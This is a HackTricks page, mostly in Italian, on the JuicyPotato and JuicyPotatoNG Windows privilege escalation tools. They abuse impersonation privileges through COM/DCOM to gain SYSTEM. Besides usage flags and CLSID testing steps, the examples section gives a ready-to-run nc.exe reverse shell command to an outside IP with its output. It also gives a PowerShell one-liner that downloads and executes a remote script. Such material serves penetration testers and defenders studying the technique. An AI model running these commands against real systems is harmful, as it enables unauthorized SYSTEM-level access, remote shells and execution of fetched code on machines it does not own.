# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato è legacy. Funziona generalmente su Windows fino a Windows 10 1803 / Windows Server 2016. Le modifiche introdotte da Microsoft a partire da Windows 10 1809 / Server 2019 hanno rotto la tecnica originale. Per quelle build e versioni successive, considera alternative moderne come PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato e altre. Vedi la pagina qui sotto per opzioni e utilizzo aggiornati.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (abuso dei privilegi 'golden') <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Funziona in modo affidabile fino a Windows 10 1803 e Windows Server 2016 quando il contesto corrente ha SeImpersonatePrivilege o SeAssignPrimaryTokenPrivilege.
- Interrotto dall'hardening di Microsoft in Windows 10 1809 / Windows Server 2019 e versioni successive. Preferisci le alternative collegate sopra per quelle build.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

Abbiamo scoperto che, oltre a `BITS`, esistono diversi COM servers che possiamo abusare. Devono semplicemente:

1. essere istanziabili dall'utente corrente, normalmente un “service user” che possiede privilegi di impersonazione
2. implementare l'interfaccia `IMarshal`
3. essere eseguiti come utente elevato (SYSTEM, Administrator, …)

Dopo alcuni test abbiamo ottenuto e testato un'ampia lista di [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato consente di:

- **Target CLSID** _scegli qualsiasi CLSID tu voglia._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare la lista organizzata per OS._
- **COM Listening port** _definisci la porta di ascolto COM che preferisci (invece della marshalled hardcoded 6666)_
- **COM Listening IP address** _lega il server a qualsiasi IP_
- **Process creation mode** _in base ai privilegi dell'utente impersonato puoi scegliere tra:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _avvia un eseguibile o script se l'exploitation ha successo_
- **Process Argument** _personalizza gli argomenti del processo lanciato_
- **RPC Server address** _per un approccio stealth puoi autenticarti a un RPC server esterno_
- **RPC Server port** _utile se vuoi autenticarti a un server esterno e il firewall sta bloccando la porta `135`…_
- **TEST mode** _principalmente per scopi di testing, es. testare i CLSID. Crea il DCOM e stampa l'utente del token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Final thoughts <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken` allora sei **SYSTEM**.

È quasi impossibile impedire l'abuso di tutti questi COM Servers. Si potrebbe pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna: sarà impegnativo.

La soluzione reale è proteggere account sensibili e applicazioni che vengono eseguiti sotto gli account `* SERVICE`. Arrestare `DCOM` certamente inibirebbe questo exploit ma potrebbe avere un serio impatto sul sistema operativo sottostante.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG reintroduce una JuicyPotato-style local privilege escalation su Windows moderni combinando:
- DCOM OXID resolution a un server RPC locale su una porta scelta, evitando il vecchio listener hardcoded 127.0.0.1:6666.
- Un SSPI hook per catturare e impersonare l'autenticazione SYSTEM in ingresso senza richiedere RpcImpersonateClient, il che abilita anche CreateProcessAsUser quando è presente solo SeAssignPrimaryTokenPrivilege.
- Tecniche per soddisfare i vincoli di attivazione DCOM (es., il precedente requisito del gruppo INTERACTIVE quando si prende di mira le classi PrintNotify / ActiveX Installer Service).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Se stai prendendo di mira Windows 10 1809 / Server 2019 dove il JuicyPotato classico è stato patchato, preferisci le alternative collegate in alto (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, ecc.). NG potrebbe essere situazionale a seconda della build e dello stato del servizio.

## Esempi

Nota: Visita [this page](https://ohpe.it/juicy-potato/CLSID/) per un elenco di CLSID da provare.

### Ottieni una nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Avvia un nuovo CMD (se hai accesso RDP)

![](<../../images/image (300).png>)

## Problemi con CLSID

Spesso il CLSID predefinito che JuicyPotato usa **non funziona** e l'exploit fallisce. Di solito servono più tentativi per trovare un **CLSID funzionante**. Per ottenere una lista di CLSID da provare per un sistema operativo specifico, visita questa pagina:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Verifica dei CLSID**

Per prima cosa, avrai bisogno di alcuni eseguibili oltre a juicypotato.exe.

Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, quindi scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quel script creerà una lista di possibili CLSID da testare.

Poi scarica [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(cambia il percorso della lista dei CLSID e quello dell'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID e **quando il numero di porta cambierà, significa che il CLSID ha funzionato**.

**Verifica** i CLSID funzionanti **usando il parametro -c**

## Riferimenti

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
